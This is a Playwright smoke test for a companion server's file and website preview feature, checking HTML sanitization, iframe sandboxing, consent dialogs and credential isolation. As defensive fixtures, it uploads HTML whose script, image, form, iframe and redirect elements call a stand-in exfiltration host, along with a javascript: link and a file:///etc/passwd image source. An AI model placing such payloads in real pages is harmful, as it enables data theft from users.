// Builds nothing. Run after ui:build + cargo build; uses isolated daemon state.
// Like screenshots.mjs, accepts PLAYWRIGHT module path and CHROME executable.
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { createServer } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';

const sleep = milliseconds => new Promise(resolve => setTimeout(resolve, milliseconds));
async function reservePort() {
  const server = createServer();
  await new Promise((resolve, reject) => { server.once('error', reject); server.listen(0, '127.0.0.1', resolve); });
  return { port: server.address().port, close: () => new Promise(resolve => server.close(resolve)) };
}
const { chromium } = await import(process.env.PLAYWRIGHT ? pathToFileURL(process.env.PLAYWRIGHT).href : 'playwright');
const admin = await reservePort();
const device = await reservePort();
const home = await mkdtemp(join(tmpdir(), 'companion-preview-smoke-'));
const workspace = await mkdtemp(join(tmpdir(), 'companion-preview-workspace-'));
await admin.close();
await device.close();
const base = `http://127.0.0.1:${admin.port}`;
const deviceBase = `http://127.0.0.1:${device.port}`;
let binary = 'server/target/debug/gentle-companion-server';
if (process.platform === 'win32') binary += '.exe';
if (process.env.COMPANION_BINARY) binary = process.env.COMPANION_BINARY;
const daemon = spawn(binary, [], {
  env: { ...process.env, PI_COMPANION_HOME: home, PI_COMPANION_ADMIN_ADDR: `127.0.0.1:${admin.port}`, PI_COMPANION_DEVICE_ADDR: `127.0.0.1:${device.port}` },
  stdio: ['ignore', 'pipe', 'pipe']
});
let daemonLog = '';
daemon.stdout.on('data', chunk => { daemonLog += chunk; });
daemon.stderr.on('data', chunk => { daemonLog += chunk; });
const daemonExit = new Promise((resolve, reject) => { daemon.once('error', reject); daemon.once('exit', resolve); });
let browser;
let browserPage;
let bridge;
const sessionId = 'preview-smoke';
const website = 'https://preview.example.com/report';
const exfil = 'https://exfil.example.com';
async function api(path, init) {
  const response = await fetch(base + path, { ...init, signal: AbortSignal.timeout(5000) });
  assert.equal(response.ok, true, `${path}: ${response.status} ${await response.clone().text()}`);
  return response.json();
}
async function ready() {
  for (let attempt = 0; attempt < 100; attempt++) {
    try { await api('/api/context'); return; } catch { await sleep(50); }
  }
  throw new Error('Owned daemon did not start: ' + daemonLog);
}
async function upload(name, mime, source) {
  const data = new FormData();
  data.append('file', new Blob([source], { type: mime }), name);
  return api(`/api/sessions/${sessionId}/files?source=agent`, { method: 'POST', body: data });
}
async function noHorizontalOverflow(page) {
  await page.evaluate(() => new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve))));
  assert.equal(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth), true, 'page fits viewport');
  const modal = page.locator('dialog[open]');
  if (await modal.count()) {
    const bounds = await modal.boundingBox();
    assert.ok(bounds.x >= 0 && bounds.x + bounds.width <= page.viewportSize().width + 1, 'dialog fits viewport width');
    assert.ok(bounds.y >= 0 && bounds.y + bounds.height <= page.viewportSize().height + 1, 'dialog fits viewport height: ' + JSON.stringify({ bounds, viewport: page.viewportSize() }));
  }
}
try {
  await Promise.race([
    ready(),
    daemonExit.then(code => { throw new Error(`Owned daemon exited before readiness (${code}): ${daemonLog}`); })
  ]);
  bridge = new WebSocket(`ws://127.0.0.1:${admin.port}/ws/bridge/${sessionId}`);
  await new Promise((resolve, reject) => { bridge.onopen = resolve; bridge.onerror = reject; });
  bridge.send(JSON.stringify({ type: 'register', session: { id: sessionId, cwd: workspace, pid: process.pid, shortTitle: 'Preview security checks', status: 'idle', remoteEnabled: true, connectedAt: new Date().toISOString(), asks: [] } }));
  await sleep(100);
  const localFiles = ['file url.txt', 'relative file.txt', 'absolute file.txt'];
  for (const name of localFiles) await writeFile(join(workspace, name), `Fixture ${name}`);
  await upload('report.html', 'text/html', `<!doctype html><html><head>
    <meta http-equiv="refresh" content="0;url=${exfil}/refresh">
    <base href="${exfil}/"><style>body{color:rgb(12,34,56);background-image:url('${exfil}/css')}</style>
    </head><body><h1>Shared report</h1><a href="${exfil}/navigate">Unsafe navigation</a>
    <script>parent.__previewPwned=true;fetch('${exfil}/script')</script>
    <img src="${exfil}/image" onerror="parent.__previewPwned=true">
    <form action="${exfil}/form"><input name="secret" value="private"></form>
    <iframe src="${exfil}/nested"></iframe>
    <svg><a href="${exfil}/svg"><text>SVG link</text></a></svg></body></html>`);
  await upload('source.svg', 'image/svg+xml', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
  bridge.send(JSON.stringify({ type: 'event', event: 'assistant.delta', payload: { kind: 'text', delta: '[Shared report](report.html)' } }));
  bridge.send(JSON.stringify({ type: 'event', event: 'agent.end', payload: {} }));
  bridge.send(JSON.stringify({ type: 'event', event: 'assistant.delta', payload: { kind: 'text', delta: `[Public website](${website}) · [Local app](http://localhost:3000) · [File URL](${pathToFileURL(join(workspace, localFiles[0])).href}) · [Relative file](relative%20file.txt) · [Absolute file](${encodeURI(join(workspace, localFiles[2]))}) · [Unsafe link](javascript:alert(1)) <img alt="Unsafe image" src="file:///etc/passwd">` } }));
  const definition = { name: 'Manual preview check', enabled: false, schedule: null, preconditions: [], actions: [{ type: 'command', command: 'echo', args: ['hello'] }], postActions: [] };
  const manual = await api('/api/automations', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(definition) });
  const paused = await api('/api/automations', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ ...definition, name: 'Paused preview check', schedule: '0 9 * * *' }) });
  const launch = { headless: true };
  if (process.env.CHROME) launch.executablePath = process.env.CHROME;
  browser = await chromium.launch(launch);
  const context = await browser.newContext({ viewport: { width: 1280, height: 900 }, reducedMotion: 'reduce' });
  let websiteRequests = 0;
  let exfilRequests = 0;
  await context.route(exfil + '/**', route => { exfilRequests++; return route.abort(); });
  const mockWebsite = route => {
    websiteRequests++;
    assert.equal(route.request().headers().authorization, undefined, 'frame never receives Companion bearer credentials');
    assert.equal(route.request().headers().referer, undefined, 'frame sends no referrer');
    return route.fulfill({ contentType: 'text/html', body: `<h1>External report</h1><script>try{parent.document.body.dataset.compromised='yes'}catch{document.body.dataset.parentBlocked='yes'}</script>` });
  };
  await context.route('https://preview.example.com/**', mockWebsite);
  const page = await context.newPage();
  browserPage = page;
  const errors = [];
  page.on('pageerror', error => errors.push(error.message));
  await page.goto(`${base}/sessions/${sessionId}`);
  const fileUrlLink = page.getByRole('link', { name: 'File URL', exact: true });
  assert.equal(await fileUrlLink.getAttribute('href'), '#', 'file URLs are inert until the bridge confirms them');
  assert.equal(await fileUrlLink.getAttribute('data-bridge-ref'), pathToFileURL(join(workspace, localFiles[0])).href);
  assert.equal(await page.getByText('Unsafe link', { exact: true }).getAttribute('href'), null, 'unsafe schemes remain stripped');
  assert.equal(await page.getByAltText('Unsafe image').getAttribute('src'), null, 'file URLs are not allowed as image sources');
  for (const [label, name] of [['File URL', localFiles[0]], ['Relative file', localFiles[1]], ['Absolute file', localFiles[2]]]) {
    await page.getByRole('link', { name: label, exact: true }).click();
    const fileDialog = page.locator('dialog[open]');
    await fileDialog.getByRole('heading', { name: 'Fetch this file from the computer running Pi?' }).waitFor();
    await fileDialog.getByRole('button', { name: /Preview/ }).click();
    await fileDialog.getByText(`Fixture ${name}`, { exact: true }).waitFor();
    await page.keyboard.press('Escape');
  }
  const reportLink = page.getByRole('link', { name: 'Shared report', exact: true });
  await reportLink.click();
  const dialog = page.locator('dialog[open]');
  const snapshot = dialog.locator('iframe');
  await snapshot.waitFor();
  assert.equal(await snapshot.getAttribute('sandbox'), '');
  const srcdoc = await snapshot.getAttribute('srcdoc');
  assert.ok(srcdoc.includes("default-src 'none'"));
  assert.ok(!/<script|<iframe|<form|<svg|<base|<a[^>]+href|onerror=/i.test(srcdoc));
  const snapshotFrame = await snapshot.elementHandle().then(handle => handle.contentFrame());
  await snapshotFrame.getByRole('heading', { name: 'Shared report' }).waitFor();
  assert.equal(await snapshotFrame.locator('body').evaluate(element => getComputedStyle(element).color), 'rgb(12, 34, 56)', 'static inline styles are retained');
  assert.equal(await page.evaluate(() => Boolean(window.__previewPwned)), false);
  await sleep(150);
  assert.equal(exfilRequests, 0, 'snapshot scripts, CSS, images, frames and redirects cannot contact external hosts');
  await noHorizontalOverflow(page);
  await page.keyboard.press('Escape');
  await dialog.waitFor({ state: 'detached' });
  assert.equal(await reportLink.evaluate(element => document.activeElement === element), true, 'closing restores link focus');

  await page.getByRole('link', { name: 'Public website', exact: true }).click();
  assert.equal(websiteRequests, 0, 'opening consent does not contact website');
  assert.equal(await dialog.locator('iframe').count(), 0);
  await page.getByRole('button', { name: 'Load website preview' }).click();
  const webFrameElement = dialog.locator('iframe');
  await webFrameElement.waitFor();
  assert.equal(await webFrameElement.getAttribute('sandbox'), 'allow-scripts');
  assert.equal(await webFrameElement.getAttribute('referrerpolicy'), 'no-referrer');
  const webFrame = await webFrameElement.elementHandle().then(handle => handle.contentFrame());
  await webFrame.locator('body[data-parent-blocked="yes"]').waitFor();
  assert.equal(await webFrame.evaluate(() => self.origin), 'null', 'website has an opaque sandbox origin');
  assert.equal(await page.locator('body').getAttribute('data-compromised'), null);
  assert.ok(websiteRequests > 0);
  await page.keyboard.press('Escape');
  await page.getByRole('link', { name: 'Local app', exact: true }).click();
  await dialog.getByRole('heading', { name: 'Open this local server through Companion?' }).waitFor();
  assert.equal(await dialog.locator('iframe').count(), 0, 'localhost is not relayed before the person confirms');
  await dialog.getByRole('button', { name: 'Open server' }).click();
  const bridgeFrame = dialog.locator('iframe');
  await bridgeFrame.waitFor();
  assert.equal(await bridgeFrame.getAttribute('sandbox'), 'allow-scripts allow-forms allow-modals');
  assert.match(await bridgeFrame.getAttribute('src'), /^\/bridge\/[0-9a-f]{64}\/$/, 'frame loads a same-origin bridge path, never the localhost address');
  await page.keyboard.press('Escape');
  assert.ok(page.url().endsWith('/sessions/' + sessionId));

  const invitation = await api('/api/pairing/start', { method: 'POST' });
  const claimResponse = await fetch(deviceBase + '/api/pairing/claim', {
    method: 'POST', headers: { 'content-type': 'application/json', origin: deviceBase },
    body: JSON.stringify({ code: invitation.code, deviceName: 'Preview smoke phone' })
  });
  assert.equal(claimResponse.ok, true);
  const claim = await claimResponse.json();
  const phone = await browser.newContext({ viewport: { width: 375, height: 812 } });
  await phone.addInitScript(({ token, origin }) => {
    if (location.origin === origin) localStorage.setItem('piCompanionDeviceToken', token);
  }, { token: claim.token, origin: deviceBase });
  await phone.route('https://preview.example.com/**', mockWebsite);
  const registry = Promise.withResolvers();
  await phone.route(deviceBase + `/api/sessions/${sessionId}/files`, async route => {
    await registry.promise;
    return route.continue();
  });
  let fileAuthorization = '';
  await phone.route(deviceBase + `/api/sessions/${sessionId}/files/*`, route => {
    fileAuthorization = route.request().headers().authorization;
    return route.continue();
  });
  const phonePage = await phone.newPage();
  await phonePage.goto(`${deviceBase}/sessions/${sessionId}`);
  phonePage.on('pageerror', error => errors.push(error.message));
  await phonePage.getByRole('link', { name: 'Shared report', exact: true }).click();
  await phonePage.getByRole('link', { name: 'Public website', exact: true }).click();
  await phonePage.getByRole('heading', { name: 'preview.example.com', exact: true }).waitFor();
  registry.resolve();
  await sleep(200);
  assert.equal(await phonePage.getByRole('heading', { name: 'preview.example.com', exact: true }).count(), 1, 'late registry response cannot overwrite a newer link in another message');
  await phonePage.keyboard.press('Escape');
  await phonePage.getByRole('link', { name: 'Shared report', exact: true }).click();
  const phoneSnapshot = phonePage.locator('dialog[open] iframe');
  await phoneSnapshot.waitFor();
  assert.equal(fileAuthorization, 'Bearer ' + claim.token, 'phone fetch uses existing authenticated file endpoint');
  assert.equal((await phoneSnapshot.getAttribute('srcdoc')).includes(claim.token), false, 'file frame never receives device credential');
  await phonePage.keyboard.press('Escape');
  await phonePage.getByRole('link', { name: 'Public website', exact: true }).click();
  await phonePage.getByRole('button', { name: 'Load website preview' }).click();
  await phonePage.locator('dialog[open] iframe').waitFor();
  const revoked = await fetch(base + '/api/devices/' + encodeURIComponent(claim.deviceId), { method: 'DELETE' });
  assert.equal(revoked.status, 204);
  await phonePage.locator('dialog[open]').waitFor({ state: 'detached' });
  await phone.close();

  for (const width of [375, 1280]) {
    await page.setViewportSize({ width, height: 900 });
    for (const theme of ['light', 'dark']) {
      await page.evaluate(value => { localStorage.setItem('pi-companion-theme', value); }, theme);
      await page.goto(`${base}/automations/${manual.id}`);
      await page.getByRole('heading', { name: 'Manual only' }).waitFor();
      assert.equal(await page.locator('html').getAttribute('data-theme'), theme);
      assert.equal(await page.getByRole('button', { name: 'Run now' }).count(), 1);
      assert.equal(await page.getByRole('button', { name: 'Resume schedule' }).count(), 0);
      await noHorizontalOverflow(page);
      await page.goto(`${base}/automations/${paused.id}`);
      await page.getByRole('heading', { name: 'Schedule paused' }).waitFor();
      await page.getByText('Finalizers', { exact: true }).last().waitFor();
      await noHorizontalOverflow(page);
      await page.screenshot({ path: join(tmpdir(), `companion-automation-${width}-${theme}.png`) });
    }
  }
  await page.getByRole('tab', { name: 'Overview', exact: true }).focus();
  await page.keyboard.press('End');
  assert.equal(await page.getByRole('tab', { name: /Run history/ }).getAttribute('aria-selected'), 'true');
  await page.keyboard.press('Home');
  assert.equal(await page.getByRole('tab', { name: 'Overview', exact: true }).getAttribute('aria-selected'), 'true');
  await page.getByRole('button', { name: 'Edit definition', exact: true }).click();
  await page.waitForFunction(() => document.activeElement === document.querySelector('#automation-editor input'));
  assert.equal(await page.getByRole('checkbox', { name: 'Scheduled triggers enabled' }).count(), 1);

  await page.setViewportSize({ width: 375, height: 812 });
  await page.goto(`${base}/sessions/${sessionId}`);
  await page.getByRole('link', { name: 'File URL', exact: true }).click();
  const fileDialog = page.locator('dialog[open]');
  await fileDialog.getByRole('heading', { name: 'Fetch this file from the computer running Pi?' }).waitFor();
  const previewAction = await fileDialog.getByRole('button', { name: /Preview/ }).boundingBox();
  const downloadAction = await fileDialog.getByRole('button', { name: /Download/ }).boundingBox();
  const cancelAction = await fileDialog.getByRole('button', { name: 'Cancel' }).boundingBox();
  assert.ok(previewAction.y + previewAction.height <= downloadAction.y && downloadAction.y + downloadAction.height <= cancelAction.y, 'file actions stack in one column');
  await noHorizontalOverflow(page);
  await page.screenshot({ path: join(tmpdir(), 'companion-file-actions-mobile.png') });
  await page.keyboard.press('Escape');
  await page.getByRole('link', { name: 'Shared report', exact: true }).click();
  await page.locator('dialog[open] iframe').waitFor();
  await noHorizontalOverflow(page);
  await page.screenshot({ path: join(tmpdir(), 'companion-preview-mobile.png') });
  await page.evaluate(() => { document.documentElement.style.fontSize = '200%'; });
  await noHorizontalOverflow(page);
  await page.evaluate(() => { document.documentElement.style.fontSize = ''; });
  await page.setViewportSize({ width: 812, height: 375 });
  await noHorizontalOverflow(page);
  assert.deepEqual(errors, [], 'no browser runtime errors');
  console.log('Browser smoke passed: manual/paused automation layouts at 375/1280px in light/dark; shared HTML sanitization and no-network policy; consent, opaque iframe origin, authenticated phone previews/revocation, no credential/referrer leakage, blocked host-local links and focus restoration.');
} catch (error) {
  if (browserPage) {
    console.error('Browser fixture state:', (await browserPage.locator('body').innerText()).slice(-3500));
    await browserPage.screenshot({ path: join(tmpdir(), 'companion-preview-failure.png') });
  }
  throw error;
} finally {
  if (browser) await browser.close();
  if (bridge) bridge.close();
  daemon.kill();
  await daemonExit;
  await rm(home, { recursive: true, force: true });
  await rm(workspace, { recursive: true, force: true });
}
